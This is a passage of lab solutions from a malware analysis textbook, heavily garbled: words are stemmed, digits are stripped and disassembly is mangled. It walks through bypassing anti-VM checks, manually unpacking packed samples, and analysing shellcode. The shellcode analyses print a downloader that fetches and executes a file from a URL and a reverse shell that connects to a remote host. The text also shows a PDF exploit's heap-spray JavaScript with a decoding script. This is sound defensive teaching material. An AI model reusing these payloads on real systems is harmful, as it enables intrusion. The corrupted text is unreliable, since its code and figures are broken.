vx db eax dx dc cmp ebx dh vmxh e setz ebpvarc fa mov al ebpvarc malwar queri io commun port x use ininstruct vmware use virtual io port commun vm host os vmware port load edx action perform load ecx previou instruct case action xa mean get vmware version type eax load magic number xd vmxh malwar check magic number echo back immedi instruct cmp result comparison move varc ultim move al sub return valu malwar doesnt appear care vmware version want see io commun port echo back magic valu runtim bypass backdoor io commun port techniqu replac instruct nop insert nop allow program complet instal analyz import dynam let continu examin installrt export code exampl c taken start installrt export jz instruct determin antivm check perform exampl c check dvm static configur option mov eax dvm dc push esi dd mov esi dsatoi add eax dh push eax str call esi atoi test eax eax db pop ecx dc jz short locd code use atoi shown bold turn string number number pars string dvm also shown bold refer dvm load eax eax advanc xd move string pointer charact turn number call atoi test check see number pars note dvm static configur option open malwar hex editor manual chang string read dvm malwar longer perform antivm checkth follow excerpt show subset static configur option lab exe domain name port shown bold log option also shown bold probabl use malwar determin xinstalllog creat use rnanewsnew rdo newsnewspracticalmalwareanalysiscom rpo dvm ssd log well complet analysi installrt analyz method subdd method long import function log string make analysi process much easier subdd method begin copi malwar window system directori shown exampl c installrt take option argument strlen check string length argument string length mean argument iexploreex use shown bold exampl c argument use target process name iexploreex default de push ebpprocessnam str call strlen test eax eax pop ecx jnz short locd db push offset aiexploreex iexploreex export argument iexploreex use target process dll inject malwar xda malwar call function find target process process list process found malwar use processs pid call subdd use common process inject trio call virtualallocex writeprocessmemori cre ateremotethread conclud installrt perform dll inject launch malwar confirm run malwar patch static dvm option use process explor see dll load anoth process next focu installsa export highlevel structur installrt export check dvm static configur option perform antivm check differ two thatinstallsa call subd main function examin subd see take option argument default irmon function creat servic xdbc specifi servic name svchost netsvc group creat irmon servic dont specifi servic name servic set blank descript display name x system servic x servic name creat servic installsa set servicedl path malwar window system directori confirm perform dynam analysi use rundllex call installsa function use regedit look irmon servic registri see chang shown figur c figur c registri overwrit servicedl irmon installsa method doesnt copi malwar window system directori instal method fail instal malwar final focu installsb export highlevel structur installsa installrt three export check dvm static configur option perform antivm check installsb call subdf main function contain extra call subaa function subaa disabl window file protect use method discuss lab solut subdf function appear contain function installsa installrt installsb also take option argument contain servic name default ntmssvc malwar use overwrit servic local system default case malwar stop ntmssvc servic run overwrit ntmssvcdll window system directori malwar attempt start servic malwar start servic malwar perform dll inject seen call xe similar installrt work except installsb inject svchostex installsb also save old servic binari uninstallsb restor necessarywel leav full analysi malwar sinc focu anti vm techniqu malwar extens backdoor consider function includ keylog captur audio video transfer file act proxi retriev system inform use revers command shell inject dll download launch command fulli analyz malwar analyz export function static configur option focus backdoor network commun capabl see write script decod network traffic gener malwarelab solut short answer malwar immedi termin insid vm unlik lab solut perform process replac svchostex forc jump xa xc x taken jump xaf taken malwar perform process replac use keylogg resourc section malwar use four differ antivm techniqu use backdoor io commun port search registri key systemcurrentcontrolsetcontroldeviceclass string vmware check mac address see default use vmware search process list stringhash function process start string vmware avoid antivm techniqu use malwar remov vmware tool modifi mac address ollydbg appli follow patch nopout instruct xd chang instruct xf xbe xor eax eax modifi instruct xf jmp xa detail analysi note lab descript malwar labex except includ antivm techniqu therefor good place start review lab solut search vulner instruct begin load binari ida pro search vulner xinstruct use findantivmpi lab solut script identifi one antivm instruct xac highlight red notic backdoor io commun port queri via instruct antivm techniqu contain function name suba ida pro function return execut insid vm otherwis return one crossrefer begin main function shown exampl c exampl c check call queri io commun port call suba queri io commun port f test eax eax jz short locaa xor eax eax jmp loca jz instruct must taken main method termin immedi jump xa disabl antivm techniqu set zero flag execut arriv jz instruct perman disabl techniqu chang test instruct xor eax eax follow start ollydbg place cursor line xf press spacebar enter xor eax eax text box click assembl find antivm techniqu use string next use string compar output lab solut output labex follow new string found lab vmware systemcurrentcontrolsetcontroldeviceclass iphlpapidl getadaptersinfo string provid us interest lead exampl string systemcurrentcontrolsetcontroldeviceclass appear registri path getadaptersinfo function use get inform network adapt dig deeper first string list vmware ida pro find one crossrefer string subroutin subc figur c show crossrefer graph subc arrow leav subc show call sever registri function function also call shown arrow loop back make recurs function base graph suspect function recurs check registri string vmware final figur c show subc call main figur c crossrefer graph subc exampl c show subc call insid main function three paramet push onto stack call includ registri key saw string list exampl c paramet subc check aa push int ac push offset subkey systemcurrentcontrolsetcontroldevic b push h hkey b call subc bb add esp ch test eax eax c jz short locc sinc systemcurrentcontrolsetcontroldeviceclass pass recurs registri function assum function recurs check registri path system residu check describ chapter examin subc see loop registri subkey deviceclass compar first six charact chang lowercas subkey name string vmware sinc goal malwar run safe environ need ensur jz instruct taken otherwis program terminateimmedi disabl antivm techniqu make sure zero flag arriv jz instruct perman disabl check chang test instruct xor eax eax use ollydbg describ search vulner instruct next use ida pro check crossrefer string getadaptersinfo exampl c see string referenc exampl c dynam resolut getadaptersinfo c push offset agetadaptersinf getadaptersinfo ce push offset libfilenam iphlpapidl call dsloadlibrarya push eax hmodul da call dsgetprocaddress e mov getadaptersinfoaddress eax malwar dynam resolv getadaptersinfo use loadlibrarya getprocaddress load result address global variabl renam getadaptersinfoaddress make easier recogn function call runtimeload address getadaptersinfo check crossrefer getadaptersinfoaddress see call two place within function sub high level function appear similar function examin lab solut load resourc section contain keylogg howev function lab appear bunch code ad start let examin code exampl c show start seri byte move byte array initi convert byte array doubleclick var set array size renam array bytearray aid analysi later exampl c byte array initi first call getadaptersinfoaddress mov ebpvar ac mov ebpvar h b mov ebpvar h b mov ebpvar b mov ebpvar ch bc mov ebpvar h c mov ebpvarf mov ebpvar h mov ebpdwbyt b lea eax ebpdwbytes push eax f push call getadaptersinfoaddress call getadaptersinfoaddress exampl c take two paramet link list ipadapterinfo structur size link list link list pass null size return dwbyte call getadaptersinfoaddress first paramet set null easi way figur much data return order alloc memori link list structur use second call getadaptersinfoaddress reason malwar use dwbyte subsequ call getprocessheap heapalloc exampl c show malwar use heapalloc call getadaptersinfoaddress second time exampl c second call getadaptersinfoaddress popul result b call dsheapalloc mov ebplpmem eax cmp ebplpmem lea edx ebpdwbyt push edx mov eax ebplpmem push eax e call getadaptersinfoaddress paramet label lpmem ida pro return valu heapalloc seen paramet pass second call getadaptersinfoaddress instead null call getadaptersinfoaddress lpmem paramet pointer link list ipadapterinfo structur size dwbyte must add ipadapterinfo structur ida pro sinc fail recogn label thing fulli press insert key within structur window add standard structur ipadapterinfo appli structur data disassembl shown tabl c tabl c appli structur inform standard constantsbefor mov edx ebplpmem cmp dword ptr edxah jz short locb mov eax ebplpmem cmp dword ptr eaxah h jnz short loc mov ecx ebplpmem cmp dword ptr ecxh jbe short loc mov edx ebplpmem cmp edx ipadapterinfotyp mibiftypeethernet jz short locb mov eax ebplpmem cmp eax ipadapterinfotyp iftypeiee jnz short loc mov ecx ebplpmem cmp ecx ipadapterinfoaddresslength jbe short loc left side tabl c show code list appli ipadapterinfo structur offset standard constant data appli structur rightclick locat given option turn number descript string shown bold right side tabl use msdn page ipadapterinfo refer learn standard constant type see x x correspond adapt type ethernet wireless address mac address three comparison shown tabl c malwar check ethernet wireless interfac confirm adapt address length greater check fail malwar loop next adapt link list check succe code shown exampl c execut exampl c compar adapt address bytearray cc jmp short locd ce mov edx ebpvarc add edx mov ebpvarc edx dd mov ecx e mov eax ebpvarc e lea edi ebpeaxbytearray e mov esi ebplpmem ec add esi h f xor edx edx f repe cmpsb f jnz short loc make code readabl rightclick h chang ipadapterinfoaddress code compar current referenc ipadapterinfo address index bytearray bytearray index use eax fill varc loop counter see increment repe cmpsb instruct compar bytearray ipadapterinfoaddress byte ecx set mean check see first byte mac address hhh hchh internet search c tell us common start default mac address vmware sinc array size know code compar nine differ mac address associ vmware perman disabl check avoid mac address comparison altogeth modifi jnz instruct xf jmp xa use ollydbg assembl function earlier forc malwar skip adapt check go straight resourc section manipul code review final check final antivm check malwar sub perform process replac code exampl c show call determin jz taken jump taken code termin without perform process replac exampl c final antivm check xor eax eax push push fdah call sub add esp test eax eax jz short loc shown exampl c antivm function sub take two paramet integ xfda function loop process list call createtoolhelpsnapshot processfirst processnext processnext insid loop code shown exampl c exampl c code compar process name string mov edx ebparg push edx lea eax ebppeszexefil push eax call sub make lowercas add esp push eax call sub get string hash add esp mov ebpvar eax f mov ecx ebpvar cmp ecx ebparg function sub call take singl paramet contain name process set paramet charact lowercas function sub call take two paramet arg lowercas string return sub result function compar xfda arg result equal xfda function return caus malwar termin word sub take process name turn number see number equal preset valu sub simpl string hash function given paramet vmware return xfda malwar cleverli use string hash avoid use string vmware comparison would made easi pick malwar analyst perman disabl final antivm check nopout call sub xd forc malwar skip check go straight processreplac code xor exampl c ensur eax regist summari malwar perform four differ check vmware three check system residu queri io commun port system residu check techniqu includ follow check first byte mac address known valu associ virtual machin check registri key vmware registri path systemcurrentcontrolsetcontroldeviceclass check process list process begin string vmware combin uppercas lowercas letterslab solut labex lab solut pack slightli modifi version upx one popular packer encount wild modif upx make resist signatur detect run peid pack execut detect packer howev section file name upx make suspect upxlik packer use run upx pack file fail modif made packer first tri unpack program manual load program ollydbg find oep first simpli page code see tail jump obviou see exampl c exampl c tail jump modifi upx packer f call ebp f pop eax f popad f lea eaxdword ptr ssesp fa push fc cmp espeax fe jnz short labfa f sub esp f jmp labf f db f db fa db fb db fc db fd db fe db tail jump follow seri x byte jump locat far away set breakpoint tail jump resum execut program breakpoint hit singlestep jmp instruct take us oep next dump process disk use plugin ollydump dump debug process accept default option click dump select filenam dump process weve dump unpack program disk finish view program import string easili analyz ida pro aquick analysi reveal code lab solut lab solut first run peid labex file learn packer fsg dulekxt unpack program manual first load ollydbg sever warn state file may pack sinc alreadi know click warn load program start entri point x easiest approach tri find oep section hop option ollydump plugin select plugin ollydump find oep section hop trace stop program x encourag x close begin execut first set execut instruct within pe file typic locat x x past suggest find oep plugin tool work instruct identifi ollydump plugin see code exampl c exampl c code oep analyz ollydbg db char u db b db ec db char j db ff db char h depend version ollydbg may disassembl code realiz code somewhat common unpredict deal pack program sign code part origin code rather part unpack stub forc ollydbg disassembl code rightclick first byte select analysi analyz code display code begin program shown exampl c exampl c code oep analyz ollydbg push ebp msvcrtc mov ebpesp push push lab push labd first two instruct exampl c look like start function convinc us found oep scroll littl alsose string wwwpracticalmalwareanalysiscom evid part origin program unpack stub next dump process disk use plugin ollydump dump debug process leav default option click dump select filenam dump process finish view program import string easili analyz ida pro quick analysi reveal code labex lab solut first run peid labex file tell us packer pecompact jeremi collak load program ollydbg see sever warn file may pack ignor warn program start address x tri find oep section hop trace option ollydump plugin see code shown exampl c ollydump guess oep howev sever reason doesnt look like oep obviou access valu base pointer file entri point data base pointer would initi exampl c ollydump guess oep use find oep section hop trace option enter push ebp mov esidword ptr ssebp mov edidword ptr ssebpc ab cld ac mov dl ae mov albyt ptr dsesi inc esi mov byte ptr dsedial next tri find oep section hop trace option see code stop ret instruct end function ntdll clearli oep sinc ollydump plugin didnt work examin code see tail jump easi spot shown exampl c eventu come code look like tail jump code retn instruct follow bunch zero byte know code cant go past point exampl c possibl tail jump sca dword ptr esedi add bhch stc retn ecf add byte ptr dseaxal b add byte ptr dseaxal add byte ptr dseaxal set breakpoint retn instruct start program firstw set regular breakpoint int ollydbg display warn breakpoint outsid code section may caus problem run program eventu get except program cant handl see code breakpoint chang know code selfmodifi breakpoint work properli deal selfmodifi code often use use hardwar breakpoint instead softwar breakpoint selfmodifi code overwrit int xcc instruct use implement softwar breakpoint start hardwar breakpoint run program see start run without ever hit breakpoint tell us probabl havent found tail jump need tri anoth strategi look entri point pack program see instruct shown exampl c exampl c start unpack stub jmp short lab push retn pushfd pushad call lab f xor eaxeax first instruct uncondit jump skip next two instruct first two instruct affect memori pushfd pushad instruct save regist flag like pack program restor regist flag immedi jump oep tri find oep set access breakpoint stack presum popad popfd instruct right tail jump lead us oep restart program stepov first three instruct program stop call instruct exampl c need find valu stack pointer set breakpoint examin regist window shown top right figur c figur c set hardwar breakpoint stack help find oep stack address xffa shown figur c set breakpoint first load address memori dump rightclick select follow dump make memori dump window appear figur c set breakpoint last piec data push onto stack rightclick first data element stack figur c select breakpoint memori access run program unfortun reach unhandl except similar set breakpoint next set breakpoint breakpoint hardwar access dword start program breakpoint trigger program break instruct shown exampl c exampl c instruct stack breakpoint trigger show tail jump f popfd push eax push lab retn instruct code see retn instruct transfer execut anoth locat probabl tail jump step instruct determin goe see code exampl c look like theorigin code call getvers dead giveaway note labex may need forc ollydbg disassembl code use analysi analyz code command exampl c oep lab solut push ebp mov ebpesp push c push labc push labc se handler instal mov eaxdword ptr fs c push eax mov dword ptr fsesp sub esp push ebx push esi push edi mov dword ptr ssebpesp call dword ptr ds kernelgetvers eip point first instruct select plugin ollydump dump debug process click get eip oep button leav option default set click dump dialog enter filenam save copi unpack program finish run program open ida pro verifi unpack success brief analysi program reveal function labex packer use varieti techniqu make difficult unpack recogn tail jump sever usual strategi ineffect packer take explicit step thwart use particular techniqu seem difficult pack program tri differ approach one work rare case none techniqu work easilylab solut open labex file peid learn pack aspack alexey solodovnikov open malwar ollydbg see first instruct pushad save regist onto stack know chapter set breakpoint stack search correspond popad instruct may good strategi packer step pushad instruct shown exampl c exampl c start unpack stub pushad call laba jmp ef go use techniqu use previou lab stepov pushad instruct window look like figur c figur c set breakpoint stack labexew rightclick esp select follow dump order display memori window shown figur c click top stack select breakpoint hardwar access dword set breakpoint stack instruct press f start program program eventu hit breakpoint see code shown exampl c exampl c instruct stack breakpoint trigger af popad b jnz short labba b mov eax b retn c ba push lab bf retn see jnz instruct immedi popad instruct know popad follow close tail jump transfer execut oep stepov jnz instruct see jump instruct ahead see push follow retn transfer execut address push onto stack might tail jump step retn instruct see instruct pointer transfer anoth area program previou lab ollydbg may disassembl code shown exampl c exampl c oep code ollydbg analyz db char u db b db ec db char j db ff b db char h c db db b e db char f db know code tell ollydbg disassembl rightclick first byte select analysi analyz code see look like legitim code telltal getmodulehandlea function shown exampl c confirm suspicion oep exampl c oep ollydbg analyz code push ebp mov ebpesp push b push labb push labac se handler instal mov eaxdword ptr fs ab push eax ac mov dword ptr fsesp b sub esp b push ebx b push esi b push edi b mov dword ptr ssebpesp bc call dword ptr dsbb kernelgetvers next select plugin ollydump dump debug process click get eip oep button accept default set click dump dialog enter filenam save copi unpack program dump program run verifi work properli open ida pro verifi unpack function lab exe lab solut program labex file labex pack winupack load file peid recogn pack winupack howev file pe header badli damag load ollydbg ida pro peview get sever error make imposs view inform pe header load file ollydbg see error state bad unknown format bit execut file ollydbg load file cant find entri point unpack stub instead break system breakpoint occur well unpack stub even reach unpack stub techniqu work could stepinto stepov instruct care reach unpack stub work would long frustrat process instead set breakpoint loadlibrari getprocaddress order bypass begin unpack stub know load import librari resolv import getprocaddress coupl last step perform unpack stub set breakpoint trigger last call getprocaddress well close tail jump there way know call getprocaddress last call execut instead set breakpoint loadlibrari getprocaddress use trialanderror figur call last begin set breakpoint first instruct loadlibrari press ctrl g enter loadlibrarya dialog take us first instruct loadlibrarya press f set breakpoint repeat process loadlibraryw breakpoint version loadlibrari press f start program use fact loadlibrari call way bypass much unpack stub possibl want keep run program last call loadlibrari dont know call loadlibrari last one late time breakpoint hit continu runningth program note librari load librari load last one program stop quickli next librari load last librari load program continu run know found last call loadlibrari set breakpoint loadlibrari see first librari load kerneldl follow advapidl fifth sixth call loadlibrari load commctrldll sixth call continu run program stop sixth call final one restart program reset breakpoint loadlibrari run program breakpoint hit sixth time paramet commctrl next set breakpoint getprocaddress perform procedur determin api function last resolv getprocaddress run program sever time find function load last call getprocaddress valu internetopena see program continu run without hit breakpoint restart program reset breakpoint loadlibrarya loadlibraryw run program final call loadlibrari run program final call getprocaddress resolv import nearli last step unpack stub task remain resolv import transfer control oep unpack stub nearli finish step code find oep step rest getprocaddress ret instruct bring us back unpack stub continu step code see look like tail jump next control transfer instruct shown eb sto dword ptr esedi eb jmp short labe tail jump rel short goe follow code doesnt look like start program ee lod byte ptr dsesi ef test alal ea jnz short labeethes instruct form short loop step code loop finish loop complet code fall instruct ea cmp byte ptr dsesial ea je short labe also tail jump rel short code target doesnt look like start program e pop ecx e inc esi e lod dword ptr dsesi e test eaxeax e je short labeb jump next block code goe retn instruct normal program would never start retn instruct also know isnt tail jump eb c retn stepov retn instruct see code shown exampl c exampl c oep labex push ebp mov ebpesp push push labd push labc f mov eaxdword ptr fs push eax mov dword ptr fsesp ad sub esp b push ebx b push esi b push edi b mov dword ptr ssebpesp b call dword ptr dsc kernelgetvers bc xor edxedx mov dlah c mov dword ptr dsedx c mov ecxeax c ecxff ce mov dword ptr dsecx shl ecx add ecxedx mov dword ptr dsfcecx df shr eax e mov dword ptr dsfeax e push e call labb ee pop ecx ef test eaxeax f jnz short labfb f push cf call lab fa pop ecx fb dword ptr ssebp ff call lab call dword ptr ds kernelgetcommandlinea mov dword ptr dsfeax f call lab mov dword ptr dseeax call labf look like oep sever reason rel far jump code start push ebp indic begin function code function call getvers getcommandlinea commonli call begin program identifi oep use plugin ollydump dump debug process dump unpack program next load program ida pro unfortun get error appar program file header fulli repair howev ida pro label main function anyway analyz program even though pe file isnt fulli reconstruct biggest roadblock dont import inform howev easili spot call import function look call data locat exampl let look main method shown exampl c exampl c main method unpack labex sub esp h lea eax esphvar mov esphvar offset amalservic malservic f push eax mov esphvarc offset sub mov esphvar mov esphvar call dword e push push call sub add esp h retn call jump call import function click dword view address import function program shown exampl c exampl c import function recogn ida pro dword dd eeh dword dd eebh dword dd dfeh c align h dword dd cach dword dd cbach make unpack code easier analyz turn ollydbg find function store locat easiest way identifi import function store given address ollydbg chang valu regist address want look exampl identifi import function store dword doubleclick eax enter valu xeeb see ollydbg label address advapistartservicectrldispatchera renam dword address ida pro startservicectrldispatchera whenev malwar call recent renam address label startservicectrldispatchera instead dword repeat process import function program analyz ida pro never pack still creat work version unpack file doesnt realli matter analyz file without look file tell labex lab solut short answer shellcod store alphabet encod payload byte store low nibbl two encod byte shellcod resolv follow function loadlibrarya getsystemdirectorya terminateprocess getcurrentprocess winexec urldownloadtofilea shellcod download url httpwwwpracticalmalwareanalysiscomshellcodeannoyuserex shellcod write systemrootsystemex execut shellcod download file url store within encod payload write disk execut detail analysi perform dynam analysi shellcodelauncherex util follow command line shellcodelauncherex labbin bp bp option caus program execut breakpoint instruct prior jump shellcod buffer system configur justintim debugg breakpoint instruct caus shellcodelauncherex load debugg discuss chapter set ollydbg justin time debugg select option justintim debug make ollydbg justintim debugg set justintim debugg still run program specifi shellcodelauncherex program theexecut debug must also sure provid program argument well shellcod decod start exampl c use alphabet encod encod byte x x p payload byte store low bit nibbl two encod byte decod load pair encod byte subtract base valu x shift add two valu store valu back memori push shown use transfer control payload retn exampl c shellcod decod alphabet encod xor ecx ecx mov cx dh jmp short locf pop esi push esi mov edi esi c locc c lodsb mov dl al f sub dl h shl dl lodsb sub al h add al dl stosb b dec ecx c jnz short locc e retn f locf f call sub start decod payload begin offset x code perform call pop pair obtain pointer data store end payload two string store urlmon url httpwwwpracticalmalwareanalysiscomshellcodeannoyuserex shellcod use findkernelbas findsymbolbyhash function describ chapter manual resolv import function findkernelbas function return locat kerneldl memori findsymbolbyhash function manual pars provid dll memori look export symbol whose name hash given dword valu function pointer store back onto stack use later exampl c show decod shellcod search function importsexampl c shellcod resolv import bf pop ebx c call findkernelbas c mov edx eax c push eceeeh kerneldllloadlibrarya cc push edx cd call findsymbolbyhash mov ebp eax push bech kerneldllgetsystemdirectorya da push edx db call findsymbolbyhash e mov ebp eax e push bbh kerneldllterminateprocess e push edx e call findsymbolbyhash ee mov ebpch eax f push bfeh kerneldllgetcurrentprocess f push edx f call findsymbolbyhash fc mov ebph eax ff push eafeh kerneldllwinexec push edx call findsymbolbyhash mov ebph eax lea eax ebx f push eax call dword ptr ebp loadlibrarya push fah urlmondllurldownloadtofilea push eax call findsymbolbyhash exampl c show main function shellcod malwar retriev system directori append string exe use local filesystem path argument urldownloadtofilea call function commonli found shellcod one function call perform http get url code specifi store specifi file path url string store end decod shellcod final shellcod execut download file cleanli exit exampl c shellcod payload e mov ebph eax push h lea edi ebxh push edi call dword ptr ebp getsystemdirectorya add edi eax f mov dword ptr edi ech e mov dword ptr edi h xex c xor ecx ecx e push ecx f push ecx lea eax ebxh push eax localfilesystempath lea eax ebx push eax url download push ecx call dword ptr ebph urldownloadtofilea c push lea eax ebxh path execut push eax call dword ptr ebph winexec call dword ptr ebph getcurrentprocess b push push eax call dword ptr ebpch terminateprocesslab solut short answer program processinject default web browser internet explor shellcod buffer locat x shellcod xore byte xe shellcod manual import follow function loadlibrarya createprocessa terminateprocess getcurrentprocess wsastartup wsasocketa connect shellcod connect ip tcp port shellcod provid remot shell cmdex detail analysi malwar start determin default web browser read registri valu hkcrhttpshellopencommand browser creat new process whose startupinfowshowwindow valu set swhide process hidden user interfac processinject default web browser common malwar trick normal web browser perform network commun follow function use process part inject function xb give current process proper privileg allow debug function x get path default web browser registerth function x creat new process whose window hidden gui shellcod buffer locat x shellcod capabl bootstrap dynam analysi easili perform open labex program ollydbg set origin start shellcod buffer rememb shellcod design execut within web browser processinject easier perform dynam analysi context labex program shellcod encod singlebyt xor scheme shown exampl c xf byte xore valu xe exampl c labex decod loop pop edi push small fh pop cx mov al eh b locb b xor edi al inc edi e loopw locb jmp short near ptr unk shellcod payload begin x set breakpoint jmp instruct exampl c let code run shellcod payload decod avail analysi code perform call pop exampl c obtain address function hash locat xbb rememb code list follow show disassembl decod byte view payload prior let decod loop run show differ valu list exampl c shellcod hash array b call loce bb dd eceeeh kerneldllloadlibrarya bf dd bfeh kerneldllcreateprocessa c dd bbh kerneldllterminateprocess c dd bfeh kerneldllgetcurrentprocess cb dd bfcedcbh wsdllwsastartup cf dd adfdh wsdllwsasocketa dd aafech wsdllconnect next shellcod process array symbol hash shown exampl c use findkernelbas findsymbolbyhash describ inchapt lab solut load next dword contain symbol hash call findsymbolbyhash store result back locat turn array hash valu function pointer array exampl c hash array process e pop esi e mov ebx esi e mov edi esi e call findkernelbas ed mov edx eax ef mov ecx c symbol kernel f locf f lodsd f push eax f push edx f call findsymbolbyhash fc stosd fd loop locf shellcod construct string ws exampl c stack push two dword valu current esp pass argument loadlibrarya load wsdll librari common trick form short string shellcod need execut shellcod proce process three remain hash valu resid wsdll exampl c import ws ff push h x push fh ws push esp call dword ptr ebx loadlibrarya c mov edx eax e mov ecx symbol ws loc lodsd push eax push edx call findsymbolbyhash b stosd c loop loc exampl c show socketcr code current esp mask eax ensur stack properli align structur use winsock librari shellcod call wsastartup initi librari network function call made call wsa socketa creat tcp socket reli valu eax increment creat correct argument wsasocketa type valu socstream af valu afinet exampl c socket creation e sub esp h mov eax fffffffh esp eax b push esp c push h call dword ptr ebxh wsastartup test eax eax jnz short locaa push eax push eax push eax b push eax protocol ipprotoip c inc eax push eax type sockstream e inc eax f push eax af afinet call dword ptr ebxh wsasocketa cmp eax ffffffffh jz short locaa exampl c show shellcod creat struct sockaddrin stack push two dword valu first valu cach networkbyteord valu ip address shellcod connect valu h sinfamili afinet sinport valu x networkbyt order sockaddrin pass call connect store ip address port way extrem compact make static analysi much difficult tri identifi network host exampl c socket connect mov esi eax c push cach server ip cac c nbo xcac push h server port x afinet nbo x mov ecx esp push h sizeof sockaddrin push ecx sockaddrin pointer e push eax f call dword ptr ebxh connect test eax eax jnz short locaa exampl c show shellcod respons creat cmdex process code store command execut cmdx stack simpl push save current esp pointer later use shellcod prepar call createprocessa argument contentsof ecx note binherithandl indic file handl open shellcod avail child process exampl c revers shell creation push dh cmdx b mov ebxch esp e sub esp h xor eax eax mov ecx h b lea edi esp e rep stosd mov byte ptr esph h sizeofstartupinfo inc byte ptr espch startfuseshowwindow inc byte ptr espdh startfusestdhandl mov eax esi f lea edi esph hstdinput stosd hstdinput socket stosd hstdoutput socket stosd hstderror socket lea eax esph push esp lpprocessinform b push eax lpstartupinfo c push ecx push ecx e push ecx f push binherithandl true push ecx push ecx push dword ptr ebxch lpcommandlin cmd push ecx call dword ptr ebx createprocessa startupinfo struct initi stack includ size dwflag field set startfuseshowwindow startfusestdhandl startfuseshowwindow indic startupinfowshowwindow field valid zeroiniti new process wont visibl startfusestdhandl indic startupinfohstdinput startupinfohstdoutput startupinfohstderror field valid handl child process use shellcod move socket handl eax load address hstdinput three stosd instruct store socket handl three handl field startupinfo structur mean new cmdex process use socket standard io common method shown chapter test connect control server run netcat host ip address command nc l p netcat run run labex anoth system set network correctli victim machin connect netcat show window commandlin banner enter command sit victim systemlab solut short answer pdf contain exampl cve buffer overflow relat adob reader utilprintf javascript implement shellcod encod use javascript percentencod store along javascript pdf shellcod manual import follow function loadlibrarya createprocessa terminateprocess getcurrentprocess gettemppatha setcurrentdirectorya createfilea getfiles setfilepoint readfil writefil closehandl globalalloc globalfre shellexecutea shellcod creat file tempfooex tempbarpdf shellcod extract two file store encod within malici pdf write user temp directori execut fooex file open barpdf document default handler detail analysi pdf format mix text binari simpli look pdf string command hex text editor provid rudimentari inform content howev trivial easi attack obfusc pdf allow object zlibcompress see filter flatedecod option object dictionari case youll need reli techniqu extract data see appendix b recommend malici pdf parser exampl c show object pdf object contain javascriptthat execut document open exampl c pdf javascript object obj length stream var payload unescapeueuec u var version appviewervers appalertrun pdf javascript version version var payload nop unescapeuaauaauaauaa heapblock nop payload bigblock unescapeuaauaa headers spray headersizeheapblocklength bigblocklengthspray bigblockbigblock fillblock bigblocksubstr spray block bigblocksubstr bigblocklengthspray whileblocklengthspray x block blockblockfillblock mem new array iii memi block heapblock var num utilprintffnum els appalertunknown pdf version endstream endobj javascript examin applic version determin whether attempt exploit abil run activ content like profil system power attack allow profil system choos exploit like succeed script perform heap spray follow call utilprintf trigger exploit line look suspici due larg number print fact internet search reveal fairli old vulner cve improp bound check allow overflow occur adob reader earlier notea heap spray involv make mani copi shellcod larg area process heap along larg nop sled attack exploit vulner overwrit function pointer return address valu point somewher memori heap attack select valu point known process heap memori segment likelihood select valu point nop sled lead valid copi shellcod high enough make reliabl way gain execut heap spray popular situat attack execut code target system prior launch exploit case javascript pdf payload variabl initi exampl c use unescap function long text string unescap function work translat charact follow follow u take next four charact treat ascii hex translat byte output order byte swap due endian follow u take next two charact treat ascii hex translat byte exampl string begin ueuecuc transform hex sequenc x xe x xec xc x use python script exampl c manual unescap shellcod payload turn binari file suitabl analysi use file lab scbin contain decod content provid lab exampl c python unescap equival script def decuinbuff manual perform javascript unescap function outarr leninbuff inbuffi elif inbuffi leninbuff inbuffi u byte unicod valu currchar intinbuffii nextchar intinbuffii switch order littleendian outarrappendchrnextchar outarrappendchrcurrchar elif leninbuff singl byte currchar intinbuffii outarrappendchrcurrchar els noth chang outarrappendinbuffi return joinoutarr payload ueuec uu outfil filelabscbin wb outfilewritedecupayload outfileclos dynam analyz shellcod use follow command shellcodelauncherex labscbin r labpdf bp r option caus program open specifi file read prior jump shellcod requir piec shellcod expect open file handl malici media file begin shellcod exampl c use call pop techniqu obtain pointer global data start exampl c shellcod global data mov ebp esp sub esp ch call subb dd eceeeh kerneldllloadlibrarya dd bfeh kerneldllcreateprocessa dd bbh kerneldllterminateprocess dd bfeh kerneldllgetcurrentprocess dd bacah kerneldllgettemppatha dd bfcfh kerneldllsetcurrentdirectorya dd cah kerneldllcreatefilea dd dfdbadh kerneldllgetfiles dd daach kerneldllsetfilepoint dd fah kerneldllreadfil dd eafh kerneldllwritefil dd ffdfbh kerneldllclosehandl dd cech kerneldllglobalalloc dd cbfh kerneldllglobalfre dd bebbeh shelldllshellexecutea dd ch pdf file size dd fh file offset dd ah file size dd bfh file offset dd eh file size shellcod exampl c use findkernelbas findsymbolbyhash function defin chapter lab solut lab solut shellcod loop symbol hash resolv store back creat function pointer array done time kernel shellcod creat string shell stack push two dword valu use argument loadlibrarya singl export shelldll resolv ad function pointer array exampl c hash array process b pop esi c mov ebph esi f mov edi esi mov ebx esi call findkernelbas mov ebp eax b mov ecx eh loc lodsd push eax push dword ptr ebp call findsymbolbyhash stosd b loop loc push ch lx push ch shel mov eax esp push eax aa call dword ptr ebx loadlibrarya ac xchg eax ecx ad lodsd ae push eax af push ecx b call findsymbolbyhash b stosd shellcod exampl c call getfiles function loop given open handl function return file size handl correspond initi handl valu add iter result compar valu store offset xc shellcod embed data valu xc exact size malici pdf shellcod find exist open handl pdf document adob reader open prior exploit launch common store encod data malici media file media file fairli larg without rais suspicion malwar requir open handl malici media file work expect r flag shellcodelauncherex must provid sampl perform work exampl c pdf handl search b xor esi esi b mov ebx ebphbb locbb bb add esi c lea eax ebp c push eax c push esi c call dword ptr ebxch getfiles c cmp eax ebxch pdf file size cc jnz short locbb ce mov ebp esi one variant techniqu find open handl malici media file involv check file size meet minimum valu point shellcod search file specif marker confirm correct handl variant save writer store exact size output file within shellcod shellcod exampl c alloc buffer memori base valu store offset x embed data store valu file size first file access malici pdf exampl c read first embed file xor edx edx push dword ptr ebxh push edx call ebxscglobalalloc da test eax eax dc jz loc e mov ebpch eax e xor edx edx e push edx e push edx e push dword ptr ebxh file offset e ec push dword ptr ebp pdf file handl ef call dword ptr ebxh setfilepoint f push dword ptr ebxh file size f push dword ptr ebpch memori buffer f push dword ptr ebp pdf file handl fb push dword ptr ebxh readfil fe call fileiowrapp code call setfilepoint adjust locat malici pdf base valu store x embed data file offset first file extract malici pdf shellcod call helper function weve name fileiowrapp read file content analysi function show follow function prototyp stdcall dword fileiowrappervoid iofuncptr dword hfile char buffptrdword bytestoxf first argument fileiowrapp function pointer either readfil orwritefil shellcod call given function pointer loop transfer entir buffer given file handl next shellcod exampl c construct output file path call gettemppatha append string fooex exampl c first filenam creation first output file xor eax eax lea edi ebph file path buffer b mov ecx h rep stosd lea edi ebph file path buffer push edi push h e call dword ptr ebxh gettemppatha xor eax eax lea edi ebph file path buffer repn scasb b dec edi c mov ebpch edi f mov dword ptr edi effh 